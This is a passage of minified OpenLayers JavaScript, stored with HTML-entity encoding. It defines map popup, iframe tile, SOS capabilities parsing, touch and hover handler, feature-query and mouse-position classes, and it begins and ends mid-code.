b=this.map.getLayerPxFromLonLat(this.lonlat);this.moveTo(b)&#125;&#125;,calculateRelativePosition:function(a)&#123;a=this.map.getLonLatFromLayerPx(a);a=this.map.getExtent().determineQuadrant(a);return OpenLayers.Bounds.oppositeQuadrant(a)&#125;,updateRelativePosition:function()&#123;&#125;,calculateNewPx:function(a)&#123;a=a.offset(this.anchor.offset);var b=this.size||this.contentSize,c="t"==this.relativePosition.charAt(0);a.y+=c?-b.h:this.anchor.size.h;c="l"==this.relativePosition.charAt(1);a.x+=c?-b.w:this.anchor.size.w;return a&#125;,CLASS_NAME:"OpenLayers.Popup.Anchored"&#125;);OpenLayers.Popup.Framed=OpenLayers.Class(OpenLayers.Popup.Anchored,&#123;imageSrc:null,imageSize:null,isAlphaImage:!1,positionBlocks:null,blocks:null,fixedRelativePosition:!1,initialize:function(a,b,c,d,e,f,g)&#123;OpenLayers.Popup.Anchored.prototype.initialize.apply(this,arguments);this.fixedRelativePosition&amp;&amp;(this.updateRelativePosition(),this.calculateRelativePosition=function(a)&#123;return this.relativePosition&#125;);this.contentDiv.style.position="absolute";this.contentDiv.style.zIndex=1;f&amp;&amp;(this.closeDiv.style.zIndex=1);this.groupDiv.style.position="absolute";this.groupDiv.style.top="0px";this.groupDiv.style.left="0px";this.groupDiv.style.height="100%";this.groupDiv.style.width="100%"&#125;,destroy:function()&#123;this.isAlphaImage=this.imageSize=this.imageSrc=null;this.fixedRelativePosition=!1;this.positionBlocks=null;for(var a=0;a&lt;this.blocks.length;a++)&#123;var b=this.blocks[a];b.image&amp;&amp;b.div.removeChild(b.image);b.image=null;b.div&amp;&amp;this.groupDiv.removeChild(b.div);b.div=null&#125;this.blocks=null;OpenLayers.Popup.Anchored.prototype.destroy.apply(this,arguments)&#125;,setBackgroundColor:function(a)&#123;&#125;,setBorder:function()&#123;&#125;,setOpacity:function(a)&#123;&#125;,setSize:function(a)&#123;OpenLayers.Popup.Anchored.prototype.setSize.apply(this,arguments);this.updateBlocks()&#125;,updateRelativePosition:function()&#123;this.padding=this.positionBlocks[this.relativePosition].padding;if(this.closeDiv)&#123;var a=this.getContentDivPadding();this.closeDiv.style.right=a.right+this.padding.right+"px";this.closeDiv.style.top=a.top+this.padding.top+"px"&#125;this.updateBlocks()&#125;,calculateNewPx:function(a)&#123;var b=OpenLayers.Popup.Anchored.prototype.calculateNewPx.apply(this,arguments);return b=b.offset(this.positionBlocks[this.relativePosition].offset)&#125;,createBlocks:function()&#123;this.blocks=[];var a=null,b;for(b in this.positionBlocks)&#123;a=b;break&#125;a=this.positionBlocks[a];for(b=0;b&lt;a.blocks.length;b++)&#123;var c=&#123;&#125;;this.blocks.push(c);c.div=OpenLayers.Util.createDiv(this.id+"_FrameDecorationDiv_"+b,null,null,null,"absolute",null,"hidden",null);c.image=(this.isAlphaImage?OpenLayers.Util.createAlphaImageDiv:OpenLayers.Util.createImage)(this.id+"_FrameDecorationImg_"+b,null,this.imageSize,this.imageSrc,"absolute",null,null,null);c.div.appendChild(c.image);this.groupDiv.appendChild(c.div)&#125;&#125;,updateBlocks:function()&#123;this.blocks||this.createBlocks();if(this.size&amp;&amp;this.relativePosition)&#123;for(var a=this.positionBlocks[this.relativePosition],b=0;b&lt;a.blocks.length;b++)&#123;var c=a.blocks[b],d=this.blocks[b],e=c.anchor.left,f=c.anchor.bottom,g=c.anchor.right,h=c.anchor.top,k=isNaN(c.size.w)?this.size.w-(g+e):c.size.w,l=isNaN(c.size.h)?this.size.h-(f+h):c.size.h;d.div.style.width=(0&gt;k?0:k)+"px";d.div.style.height=(0&gt;l?0:l)+"px";d.div.style.left=null!=e?e+"px":"";d.div.style.bottom=null!=f?f+"px":"";d.div.style.right=null!=g?g+"px":"";d.div.style.top=null!=h?h+"px":"";d.image.style.left=c.position.x+"px";d.image.style.top=c.position.y+"px"&#125;this.contentDiv.style.left=this.padding.left+"px";this.contentDiv.style.top=this.padding.top+"px"&#125;&#125;,CLASS_NAME:"OpenLayers.Popup.Framed"&#125;);OpenLayers.Popup.FramedCloud=OpenLayers.Class(OpenLayers.Popup.Framed,&#123;contentDisplayClass:"olFramedCloudPopupContent",autoSize:!0,panMapIfOutOfView:!0,imageSize:new OpenLayers.Size(1276,736),isAlphaImage:!1,fixedRelativePosition:!1,positionBlocks:&#123;tl:&#123;offset:new OpenLayers.Pixel(44,0),padding:new OpenLayers.Bounds(8,40,8,9),blocks:[&#123;size:new OpenLayers.Size("auto","auto"),anchor:new OpenLayers.Bounds(0,51,22,0),position:new OpenLayers.Pixel(0,0)&#125;,&#123;size:new OpenLayers.Size(22,"auto"),anchor:new OpenLayers.Bounds(null,50,0,0),position:new OpenLayers.Pixel(-1238,0)&#125;,&#123;size:new OpenLayers.Size("auto",19),anchor:new OpenLayers.Bounds(0,32,22,null),position:new OpenLayers.Pixel(0,-631)&#125;,&#123;size:new OpenLayers.Size(22,18),anchor:new OpenLayers.Bounds(null,32,0,null),position:new OpenLayers.Pixel(-1238,-632)&#125;,&#123;size:new OpenLayers.Size(81,35),anchor:new OpenLayers.Bounds(null,0,0,null),position:new OpenLayers.Pixel(0,-688)&#125;]&#125;,tr:&#123;offset:new OpenLayers.Pixel(-45,0),padding:new OpenLayers.Bounds(8,40,8,9),blocks:[&#123;size:new OpenLayers.Size("auto","auto"),anchor:new OpenLayers.Bounds(0,51,22,0),position:new OpenLayers.Pixel(0,0)&#125;,&#123;size:new OpenLayers.Size(22,"auto"),anchor:new OpenLayers.Bounds(null,50,0,0),position:new OpenLayers.Pixel(-1238,0)&#125;,&#123;size:new OpenLayers.Size("auto",19),anchor:new OpenLayers.Bounds(0,32,22,null),position:new OpenLayers.Pixel(0,-631)&#125;,&#123;size:new OpenLayers.Size(22,19),anchor:new OpenLayers.Bounds(null,32,0,null),position:new OpenLayers.Pixel(-1238,-631)&#125;,&#123;size:new OpenLayers.Size(81,35),anchor:new OpenLayers.Bounds(0,0,null,null),position:new OpenLayers.Pixel(-215,-687)&#125;]&#125;,bl:&#123;offset:new OpenLayers.Pixel(45,0),padding:new OpenLayers.Bounds(8,9,8,40),blocks:[&#123;size:new OpenLayers.Size("auto","auto"),anchor:new OpenLayers.Bounds(0,21,22,32),position:new OpenLayers.Pixel(0,0)&#125;,&#123;size:new OpenLayers.Size(22,"auto"),anchor:new OpenLayers.Bounds(null,21,0,32),position:new OpenLayers.Pixel(-1238,0)&#125;,&#123;size:new OpenLayers.Size("auto",21),anchor:new OpenLayers.Bounds(0,0,22,null),position:new OpenLayers.Pixel(0,-629)&#125;,&#123;size:new OpenLayers.Size(22,21),anchor:new OpenLayers.Bounds(null,0,0,null),position:new OpenLayers.Pixel(-1238,-629)&#125;,&#123;size:new OpenLayers.Size(81,33),anchor:new OpenLayers.Bounds(null,null,0,0),position:new OpenLayers.Pixel(-101,-674)&#125;]&#125;,br:&#123;offset:new OpenLayers.Pixel(-44,0),padding:new OpenLayers.Bounds(8,9,8,40),blocks:[&#123;size:new OpenLayers.Size("auto","auto"),anchor:new OpenLayers.Bounds(0,21,22,32),position:new OpenLayers.Pixel(0,0)&#125;,&#123;size:new OpenLayers.Size(22,"auto"),anchor:new OpenLayers.Bounds(null,21,0,32),position:new OpenLayers.Pixel(-1238,0)&#125;,&#123;size:new OpenLayers.Size("auto",21),anchor:new OpenLayers.Bounds(0,0,22,null),position:new OpenLayers.Pixel(0,-629)&#125;,&#123;size:new OpenLayers.Size(22,21),anchor:new OpenLayers.Bounds(null,0,0,null),position:new OpenLayers.Pixel(-1238,-629)&#125;,&#123;size:new OpenLayers.Size(81,33),anchor:new OpenLayers.Bounds(0,null,null,0),position:new OpenLayers.Pixel(-311,-674)&#125;]&#125;&#125;,minSize:new OpenLayers.Size(105,10),maxSize:new OpenLayers.Size(1200,660),initialize:function(a,b,c,d,e,f,g)&#123;this.imageSrc=OpenLayers.Util.getImageLocation("cloud-popup-relative.png");OpenLayers.Popup.Framed.prototype.initialize.apply(this,arguments);this.contentDiv.className=this.contentDisplayClass&#125;,CLASS_NAME:"OpenLayers.Popup.FramedCloud"&#125;);OpenLayers.Tile.Image.IFrame=&#123;useIFrame:null,blankImageUrl:"data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAQAIBRAA7",draw:function()&#123;if(OpenLayers.Tile.Image.prototype.shouldDraw.call(this))&#123;var a=this.layer.getURL(this.bounds),b=this.useIFrame;this.useIFrame=null!==this.maxGetUrlLength&amp;&amp;!this.layer.async&amp;&amp;a.length&gt;this.maxGetUrlLength;a=b&amp;&amp;!this.useIFrame;b=!b&amp;&amp;this.useIFrame;if(a||b)this.imgDiv&amp;&amp;this.imgDiv.parentNode===this.frame&amp;&amp;this.frame.removeChild(this.imgDiv),this.imgDiv=null,a&amp;&amp;this.frame.removeChild(this.frame.firstChild)&#125;return OpenLayers.Tile.Image.prototype.draw.apply(this,arguments)&#125;,getImage:function()&#123;if(!0===this.useIFrame)&#123;if(!this.frame.childNodes.length)&#123;var a=document.createElement("div"),b=a.style;b.position="absolute";b.width="100%";b.height="100%";b.zIndex=1;b.backgroundImage="url("+this.blankImageUrl+")";this.frame.appendChild(a)&#125;a=this.id+"_iFrame";9&gt;parseFloat(navigator.appVersion.split("MSIE")[1])?(b=document.createElement('&lt;iframe name="'+a+'"&gt;'),b.style.backgroundColor="#FFFFFF",b.style.filter="chroma(color=#FFFFFF)"):(b=document.createElement("iframe"),b.style.backgroundColor="transparent",b.name=a);b.scrolling="no";b.marginWidth="0px";b.marginHeight="0px";b.frameBorder="0";b.style.position="absolute";b.style.width="100%";b.style.height="100%";1&gt;this.layer.opacity&amp;&amp;OpenLayers.Util.modifyDOMElement(b,null,null,null,null,null,null,this.layer.opacity);this.frame.appendChild(b);return this.imgDiv=b&#125;return OpenLayers.Tile.Image.prototype.getImage.apply(this,arguments)&#125;,createRequestForm:function()&#123;var a=document.createElement("form");a.method="POST";var b=this.layer.params._OLSALT,b=(b?b+"_":"")+this.bounds.toBBOX();a.action=OpenLayers.Util.urlAppend(this.layer.url,b);a.target=this.id+"_iFrame";this.layer.getImageSize();var b=OpenLayers.Util.getParameters(this.url),c,d;for(d in b)c=document.createElement("input"),c.type="hidden",c.name=d,c.value=b[d],a.appendChild(c);return a&#125;,setImgSrc:function(a)&#123;if(!0===this.useIFrame)if(a)&#123;var b=this.createRequestForm();this.frame.appendChild(b);b.submit();this.frame.removeChild(b)&#125;else this.imgDiv.parentNode===this.frame&amp;&amp;(this.frame.removeChild(this.imgDiv),this.imgDiv=null);else OpenLayers.Tile.Image.prototype.setImgSrc.apply(this,arguments)&#125;,onImageLoad:function()&#123;OpenLayers.Tile.Image.prototype.onImageLoad.apply(this,arguments);!0===this.useIFrame&amp;&amp;(this.imgDiv.style.opacity=1,this.frame.style.opacity=this.layer.opacity)&#125;,createBackBuffer:function()&#123;var a;!1===this.useIFrame&amp;&amp;(a=OpenLayers.Tile.Image.prototype.createBackBuffer.call(this));return a&#125;&#125;;OpenLayers.Format.SOSCapabilities=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,&#123;defaultVersion:"1.0.0",CLASS_NAME:"OpenLayers.Format.SOSCapabilities"&#125;);OpenLayers.Format.SOSCapabilities.v1_0_0=OpenLayers.Class(OpenLayers.Format.SOSCapabilities,&#123;namespaces:&#123;ows:"http://www.opengis.net/ows/1.1",sos:"http://www.opengis.net/sos/1.0",gml:"http://www.opengis.net/gml",xlink:"http://www.w3.org/1999/xlink"&#125;,regExes:&#123;trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g&#125;,initialize:function(a)&#123;OpenLayers.Format.XML.prototype.initialize.apply(this,[a]);this.options=a&#125;,read:function(a)&#123;"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b=&#123;&#125;;this.readNode(a,b);return b&#125;,readers:&#123;gml:OpenLayers.Util.applyDefaults(&#123;name:function(a,b)&#123;b.name=this.getChildValue(a)&#125;,TimePeriod:function(a,b)&#123;b.timePeriod=&#123;&#125;;this.readChildNodes(a,b.timePeriod)&#125;,beginPosition:function(a,b)&#123;b.beginPosition=this.getChildValue(a)&#125;,endPosition:function(a,b)&#123;b.endPosition=this.getChildValue(a)&#125;&#125;,OpenLayers.Format.GML.v3.prototype.readers.gml),sos:&#123;Capabilities:function(a,b)&#123;this.readChildNodes(a,b)&#125;,Contents:function(a,b)&#123;b.contents=&#123;&#125;;this.readChildNodes(a,b.contents)&#125;,ObservationOfferingList:function(a,b)&#123;b.offeringList=&#123;&#125;;this.readChildNodes(a,b.offeringList)&#125;,ObservationOffering:function(a,b)&#123;var c=this.getAttributeNS(a,this.namespaces.gml,"id");b[c]=&#123;procedures:[],observedProperties:[],featureOfInterestIds:[],responseFormats:[],resultModels:[],responseModes:[]&#125;;this.readChildNodes(a,b[c])&#125;,time:function(a,b)&#123;b.time=&#123;&#125;;this.readChildNodes(a,b.time)&#125;,procedure:function(a,b)&#123;b.procedures.push(this.getAttributeNS(a,this.namespaces.xlink,"href"))&#125;,observedProperty:function(a,b)&#123;b.observedProperties.push(this.getAttributeNS(a,this.namespaces.xlink,"href"))&#125;,featureOfInterest:function(a,b)&#123;b.featureOfInterestIds.push(this.getAttributeNS(a,this.namespaces.xlink,"href"))&#125;,responseFormat:function(a,b)&#123;b.responseFormats.push(this.getChildValue(a))&#125;,resultModel:function(a,b)&#123;b.resultModels.push(this.getChildValue(a))&#125;,responseMode:function(a,b)&#123;b.responseModes.push(this.getChildValue(a))&#125;&#125;,ows:OpenLayers.Format.OWSCommon.v1_1_0.prototype.readers.ows&#125;,CLASS_NAME:"OpenLayers.Format.SOSCapabilities.v1_0_0"&#125;);OpenLayers.Handler.Pinch=OpenLayers.Class(OpenLayers.Handler,&#123;started:!1,stopDown:!1,pinching:!1,last:null,start:null,touchstart:function(a)&#123;var b=!0;this.pinching=!1;if(OpenLayers.Event.isMultiTouch(a))this.started=!0,this.last=this.start=&#123;distance:this.getDistance(a.touches),delta:0,scale:1&#125;,this.callback("start",[a,this.start]),b=!this.stopDown;else&#123;if(this.started)return!1;this.started=!1;this.last=this.start=null&#125;OpenLayers.Event.preventDefault(a);return b&#125;,touchmove:function(a)&#123;if(this.started&amp;&amp;OpenLayers.Event.isMultiTouch(a))&#123;this.pinching=!0;var b=this.getPinchData(a);this.callback("move",[a,b]);this.last=b;OpenLayers.Event.stop(a)&#125;else if(this.started)return!1;return!0&#125;,touchend:function(a)&#123;return this.started&amp;&amp;!OpenLayers.Event.isMultiTouch(a)?(this.pinching=this.started=!1,this.callback("done",[a,this.start,this.last]),this.last=this.start=null,!1):!0&#125;,activate:function()&#123;var a=!1;OpenLayers.Handler.prototype.activate.apply(this,arguments)&amp;&amp;(this.pinching=!1,a=!0);return a&#125;,deactivate:function()&#123;var a=!1;OpenLayers.Handler.prototype.deactivate.apply(this,arguments)&amp;&amp;(this.pinching=this.started=!1,this.last=this.start=null,a=!0);return a&#125;,getDistance:function(a)&#123;var b=a[0];a=a[1];return Math.sqrt(Math.pow(b.olClientX-a.olClientX,2)+Math.pow(b.olClientY-a.olClientY,2))&#125;,getPinchData:function(a)&#123;a=this.getDistance(a.touches);return&#123;distance:a,delta:this.last.distance-a,scale:a/this.start.distance&#125;&#125;,CLASS_NAME:"OpenLayers.Handler.Pinch"&#125;);OpenLayers.Control.NavToolbar=OpenLayers.Class(OpenLayers.Control.Panel,&#123;initialize:function(a)&#123;OpenLayers.Control.Panel.prototype.initialize.apply(this,[a]);this.addControls([new OpenLayers.Control.Navigation,new OpenLayers.Control.ZoomBox])&#125;,draw:function()&#123;var a=OpenLayers.Control.Panel.prototype.draw.apply(this,arguments);null===this.defaultControl&amp;&amp;(this.defaultControl=this.controls[0]);return a&#125;,CLASS_NAME:"OpenLayers.Control.NavToolbar"&#125;);OpenLayers.Strategy.Refresh=OpenLayers.Class(OpenLayers.Strategy,&#123;force:!1,interval:0,timer:null,activate:function()&#123;var a=OpenLayers.Strategy.prototype.activate.call(this);a&amp;&amp;(!0===this.layer.visibility&amp;&amp;this.start(),this.layer.events.on(&#123;visibilitychanged:this.reset,scope:this&#125;));return a&#125;,deactivate:function()&#123;var a=OpenLayers.Strategy.prototype.deactivate.call(this);a&amp;&amp;(this.stop(),this.layer.events.un(&#123;visibilitychanged:this.reset,scope:this&#125;));return a&#125;,reset:function()&#123;!0===this.layer.visibility?this.start():this.stop()&#125;,start:function()&#123;this.interval&amp;&amp;("number"===typeof this.interval&amp;&amp;0&lt;this.interval)&amp;&amp;(this.timer=window.setInterval(OpenLayers.Function.bind(this.refresh,this),this.interval))&#125;,refresh:function()&#123;this.layer&amp;&amp;(this.layer.refresh&amp;&amp;"function"==typeof this.layer.refresh)&amp;&amp;this.layer.refresh(&#123;force:this.force&#125;)&#125;,stop:function()&#123;null!==this.timer&amp;&amp;(window.clearInterval(this.timer),this.timer=null)&#125;,CLASS_NAME:"OpenLayers.Strategy.Refresh"&#125;);OpenLayers.Layer.ArcGIS93Rest=OpenLayers.Class(OpenLayers.Layer.Grid,&#123;DEFAULT_PARAMS:&#123;format:"png"&#125;,isBaseLayer:!0,initialize:function(a,b,c,d)&#123;var e=[];c=OpenLayers.Util.upperCaseObject(c);e.push(a,b,c,d);OpenLayers.Layer.Grid.prototype.initialize.apply(this,e);OpenLayers.Util.applyDefaults(this.params,OpenLayers.Util.upperCaseObject(this.DEFAULT_PARAMS));this.params.TRANSPARENT&amp;&amp;"true"==this.params.TRANSPARENT.toString().toLowerCase()&amp;&amp;(null!=d&amp;&amp;d.isBaseLayer||(this.isBaseLayer=!1),"jpg"==this.params.FORMAT&amp;&amp;(this.params.FORMAT=OpenLayers.Util.alphaHack()?"gif":"png"))&#125;,clone:function(a)&#123;null==a&amp;&amp;(a=new OpenLayers.Layer.ArcGIS93Rest(this.name,this.url,this.params,this.getOptions()));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,[a])&#125;,getURL:function(a)&#123;a=this.adjustBounds(a);var b=this.projection.getCode().split(":"),b=b[b.length-1],c=this.getImageSize();a=&#123;BBOX:a.toBBOX(),SIZE:c.w+","+c.h,F:"image",BBOXSR:b,IMAGESR:b&#125;;if(this.layerDefs)&#123;var b=[],d;for(d in this.layerDefs)this.layerDefs.hasOwnProperty(d)&amp;&amp;this.layerDefs[d]&amp;&amp;(b.push(d),b.push(":"),b.push(this.layerDefs[d]),b.push(";"));0&lt;b.length&amp;&amp;(a.LAYERDEFS=b.join(""))&#125;return this.getFullRequestString(a)&#125;,setLayerFilter:function(a,b)&#123;this.layerDefs||(this.layerDefs=&#123;&#125;);b?this.layerDefs[a]=b:delete this.layerDefs[a]&#125;,clearLayerFilter:function(a)&#123;a?delete this.layerDefs[a]:delete this.layerDefs&#125;,mergeNewParams:function(a)&#123;a=[OpenLayers.Util.upperCaseObject(a)];return OpenLayers.Layer.Grid.prototype.mergeNewParams.apply(this,a)&#125;,CLASS_NAME:"OpenLayers.Layer.ArcGIS93Rest"&#125;);OpenLayers.Handler.Hover=OpenLayers.Class(OpenLayers.Handler,&#123;delay:500,pixelTolerance:null,stopMove:!1,px:null,timerId:null,mousemove:function(a)&#123;this.passesTolerance(a.xy)&amp;&amp;(this.clearTimer(),this.callback("move",[a]),this.px=a.xy,a=OpenLayers.Util.extend(&#123;&#125;,a),this.timerId=window.setTimeout(OpenLayers.Function.bind(this.delayedCall,this,a),this.delay));return!this.stopMove&#125;,mouseout:function(a)&#123;OpenLayers.Util.mouseLeft(a,this.map.viewPortDiv)&amp;&amp;(this.clearTimer(),this.callback("move",[a]));return!0&#125;,passesTolerance:function(a)&#123;var b=!0;this.pixelTolerance&amp;&amp;this.px&amp;&amp;Math.sqrt(Math.pow(this.px.x-a.x,2)+Math.pow(this.px.y-a.y,2))&lt;this.pixelTolerance&amp;&amp;(b=!1);return b&#125;,clearTimer:function()&#123;null!=this.timerId&amp;&amp;(window.clearTimeout(this.timerId),this.timerId=null)&#125;,delayedCall:function(a)&#123;this.callback("pause",[a])&#125;,deactivate:function()&#123;var a=!1;OpenLayers.Handler.prototype.deactivate.apply(this,arguments)&amp;&amp;(this.clearTimer(),a=!0);return a&#125;,CLASS_NAME:"OpenLayers.Handler.Hover"&#125;);OpenLayers.Control.GetFeature=OpenLayers.Class(OpenLayers.Control,&#123;protocol:null,multipleKey:null,toggleKey:null,modifiers:null,multiple:!1,click:!0,single:!0,clickout:!0,toggle:!1,clickTolerance:5,hover:!1,box:!1,maxFeatures:10,features:null,hoverFeature:null,handlers:null,hoverResponse:null,filterType:OpenLayers.Filter.Spatial.BBOX,initialize:function(a)&#123;a.handlerOptions=a.handlerOptions||&#123;&#125;;OpenLayers.Control.prototype.initialize.apply(this,[a]);this.features=&#123;&#125;;this.handlers=&#123;&#125;;this.click&amp;&amp;(this.handlers.click=new OpenLayers.Handler.Click(this,&#123;click:this.selectClick&#125;,this.handlerOptions.click||&#123;&#125;));this.box&amp;&amp;(this.handlers.box=new OpenLayers.Handler.Box(this,&#123;done:this.selectBox&#125;,OpenLayers.Util.extend(this.handlerOptions.box,&#123;boxDivClassName:"olHandlerBoxSelectFeature"&#125;)));this.hover&amp;&amp;(this.handlers.hover=new OpenLayers.Handler.Hover(this,&#123;move:this.cancelHover,pause:this.selectHover&#125;,OpenLayers.Util.extend(this.handlerOptions.hover,&#123;delay:250,pixelTolerance:2&#125;)))&#125;,activate:function()&#123;if(!this.active)for(var a in this.handlers)this.handlers[a].activate();return OpenLayers.Control.prototype.activate.apply(this,arguments)&#125;,deactivate:function()&#123;if(this.active)for(var a in this.handlers)this.handlers[a].deactivate();return OpenLayers.Control.prototype.deactivate.apply(this,arguments)&#125;,selectClick:function(a)&#123;var b=this.pixelToBounds(a.xy);this.setModifiers(a);this.request(b,&#123;single:this.single&#125;)&#125;,selectBox:function(a)&#123;var b;if(a instanceof OpenLayers.Bounds)b=this.map.getLonLatFromPixel(&#123;x:a.left,y:a.bottom&#125;),a=this.map.getLonLatFromPixel(&#123;x:a.right,y:a.top&#125;),b=new OpenLayers.Bounds(b.lon,b.lat,a.lon,a.lat);else&#123;if(this.click)return;b=this.pixelToBounds(a)&#125;this.setModifiers(this.handlers.box.dragHandler.evt);this.request(b)&#125;,selectHover:function(a)&#123;a=this.pixelToBounds(a.xy);this.request(a,&#123;single:!0,hover:!0&#125;)&#125;,cancelHover:function()&#123;this.hoverResponse&amp;&amp;(this.protocol.abort(this.hoverResponse),this.hoverResponse=null,OpenLayers.Element.removeClass(this.map.viewPortDiv,"olCursorWait"))&#125;,request:function(a,b)&#123;b=b||&#123;&#125;;var c=new OpenLayers.Filter.Spatial(&#123;type:this.filterType,value:a&#125;);OpenLayers.Element.addClass(this.map.viewPortDiv,"olCursorWait");c=this.protocol.read(&#123;maxFeatures:!0==b.single?this.maxFeatures:void 0,filter:c,callback:function(c)&#123;c.success()&amp;&amp;(c.features.length?!0==b.single?this.selectBestFeature(c.features,a.getCenterLonLat(),b):this.select(c.features):b.hover?this.hoverSelect():(this.events.triggerEvent("clickout"),this.clickout&amp;&amp;this.unselectAll()));OpenLayers.Element.removeClass(this.map.viewPortDiv,"olCursorWait")&#125;,scope:this&#125;);!0==b.hover&amp;&amp;(this.hoverResponse=c)&#125;,selectBestFeature:function(a,b,c)&#123;c=c||&#123;&#125;;if(a.length)&#123;b=new OpenLayers.Geometry.Point(b.lon,b.lat);for(var d,e,f,g=Number.MAX_VALUE,h=0;h&lt;a.length&amp;&amp;!(d=a[h],d.geometry&amp;&amp;(f=b.distanceTo(d.geometry,&#123;edge:!1&#125;),f&lt;g&amp;&amp;(g=f,e=d,0==g)));++h);!0==c.hover?this.hoverSelect(e):this.select(e||a)&#125;&#125;,setModifiers:function(a)&#123;this.modifiers=&#123;multiple:this.multiple||this.multipleKey&amp;&amp;a[this.multipleKey],toggle:this.toggle||this.toggleKey&amp;&amp;a[this.toggleKey]&#125;&#125;,select:function(a)&#123;this.modifiers.multiple||this.modifiers.toggle||this.unselectAll();OpenLayers.Util.isArray(a)||(a=[a]);var b=this.events.triggerEvent("beforefeaturesselected",&#123;features:a&#125;);if(!1!==b)&#123;for(var c=[],d,e=0,f=a.length;e&lt;f;++e)d=a[e],this.features[d.fid||d.id]?this.modifiers.toggle&amp;&amp;this.unselect(this.features[d.fid||d.id]):(b=this.events.triggerEvent("beforefeatureselected",&#123;feature:d&#125;),!1!==b&amp;&amp;(this.features[d.fid||d.id]=d,c.push(d),this.events.triggerEvent("featureselected",&#123;feature:d&#125;)));this.events.triggerEvent("featuresselected",&#123;features:c&#125;)&#125;&#125;,hoverSelect:function(a)&#123;var b=a?a.fid||a.id:null,c=this.hoverFeature?this.hoverFeature.fid||this.hoverFeature.id:null;c&amp;&amp;c!=b&amp;&amp;(this.events.triggerEvent("outfeature",&#123;feature:this.hoverFeature&#125;),this.hoverFeature=null);b&amp;&amp;b!=c&amp;&amp;(this.events.triggerEvent("hoverfeature",&#123;feature:a&#125;),this.hoverFeature=a)&#125;,unselect:function(a)&#123;delete this.features[a.fid||a.id];this.events.triggerEvent("featureunselected",&#123;feature:a&#125;)&#125;,unselectAll:function()&#123;for(var a in this.features)this.unselect(this.features[a])&#125;,setMap:function(a)&#123;for(var b in this.handlers)this.handlers[b].setMap(a);OpenLayers.Control.prototype.setMap.apply(this,arguments)&#125;,pixelToBounds:function(a)&#123;var b=a.add(-this.clickTolerance/2,this.clickTolerance/2);a=a.add(this.clickTolerance/2,-this.clickTolerance/2);b=this.map.getLonLatFromPixel(b);a=this.map.getLonLatFromPixel(a);return new OpenLayers.Bounds(b.lon,b.lat,a.lon,a.lat)&#125;,CLASS_NAME:"OpenLayers.Control.GetFeature"&#125;);OpenLayers.Format.QueryStringFilter=function()&#123;function a(a)&#123;a=a.replace(/%/g,"\\%");a=a.replace(/\\\\\.(\*)?/g,function(a,b)&#123;return b?a:"\\\\_"&#125;);a=a.replace(/\\\\\.\*/g,"\\\\%");a=a.replace(/(\\)?\.(\*)?/g,function(a,b,c)&#123;return b||c?a:"_"&#125;);a=a.replace(/(\\)?\.\*/g,function(a,b)&#123;return b?a:"%"&#125;);a=a.replace(/\\\./g,".");return a=a.replace(/(\\)?\\\*/g,function(a,b)&#123;return b?a:"*"&#125;)&#125;var b=&#123;&#125;;b[OpenLayers.Filter.Comparison.EQUAL_TO]="eq";b[OpenLayers.Filter.Comparison.NOT_EQUAL_TO]="ne";b[OpenLayers.Filter.Comparison.LESS_THAN]="lt";b[OpenLayers.Filter.Comparison.LESS_THAN_OR_EQUAL_TO]="lte";b[OpenLayers.Filter.Comparison.GREATER_THAN]="gt";b[OpenLayers.Filter.Comparison.GREATER_THAN_OR_EQUAL_TO]="gte";b[OpenLayers.Filter.Comparison.LIKE]="ilike";return OpenLayers.Class(OpenLayers.Format,&#123;wildcarded:!1,srsInBBOX:!1,write:function(c,d)&#123;d=d||&#123;&#125;;var e=c.CLASS_NAME,e=e.substring(e.lastIndexOf(".")+1);switch(e)&#123;case "Spatial":switch(c.type)&#123;case OpenLayers.Filter.Spatial.BBOX:d.bbox=c.value.toArray();this.srsInBBOX&amp;&amp;c.projection&amp;&amp;d.bbox.push(c.projection.getCode());break;case OpenLayers.Filter.Spatial.DWITHIN:d.tolerance=c.distance;case OpenLayers.Filter.Spatial.WITHIN:d.lon=c.value.x;d.lat=c.value.y;break;default:OpenLayers.Console.warn("Unknown spatial filter type "+c.type)&#125;break;case "Comparison":e=b[c.type];if(void 0!==e)&#123;var f=c.value;c.type==OpenLayers.Filter.Comparison.LIKE&amp;&amp;(f=a(f),this.wildcarded&amp;&amp;(f="%"+f+"%"));d[c.property+"__"+e]=f;d.queryable=d.queryable||[];d.queryable.push(c.property)&#125;else OpenLayers.Console.warn("Unknown comparison filter type "+c.type);break;case "Logical":if(c.type===OpenLayers.Filter.Logical.AND)for(e=0,f=c.filters.length;e&lt;f;e++)d=this.write(c.filters[e],d);else OpenLayers.Console.warn("Unsupported logical filter type "+c.type);break;default:OpenLayers.Console.warn("Unknown filter type "+e)&#125;return d&#125;,CLASS_NAME:"OpenLayers.Format.QueryStringFilter"&#125;)&#125;();OpenLayers.Control.MousePosition=OpenLayers.Class(OpenLayers.Control,&#123;autoActivate:!0,element:null,prefix:"",separator:", ",suffix:"",numDigits:5,granularity:10,emptyString:null,lastXy:null,displayProjection:null,destroy:function()&#123;this.deactivate();OpenLayers.Control.prototype.destroy.apply(this,arguments)&#125;,activate:function()&#123;return OpenLayers.Control.prototype.activate.apply(this,arguments)?(this.map.events.register("mousemove",this,this.redraw),this.map.events.register("mouseout",this,this.reset),this.redraw(),!0):!1&#125;,deactivate:function()&#123;return OpenLayers.Control.prototype.deactivate.apply(this,arguments)?(this.map.events.unregister("mousemove",this,this.redraw),this.map.events.unregister("mouseout",this,this.reset),this.element.innerHTML="",!0):!1&#125;,draw:function()&#123;OpenLayers.Control.prototype.draw.apply(this,arguments);this.element||(this.div.left="",this.div.top="",this.element=this.div);return this.div&#125;,redraw:function(a)&#123;var b;if(null==a)this.reset();else if(null==this.lastXy||Math.abs(a.xy.x-this.lastXy.x)&gt;this.granularity||Math.abs(a.xy.y-this.lastXy.y)&gt;this.granularity)this.lastXy=a.xy;else if(b=this.map.getLonLatFromPixel(a.xy))this.displayProjection&amp;&amp;b.transform(this.map.getProjectionObject(),this.displayProjection),this.lastXy=a.xy,a=this.formatOutput(b),a!=this.element.innerHTML&amp;&amp;(this.element.innerHTML=a)&#125;,reset:function(a)&#123;null!=this.emptyString&amp;&amp;(this.element.innerHTML=this.emptyString)&#125;,formatOutput:function(a)&#123;var 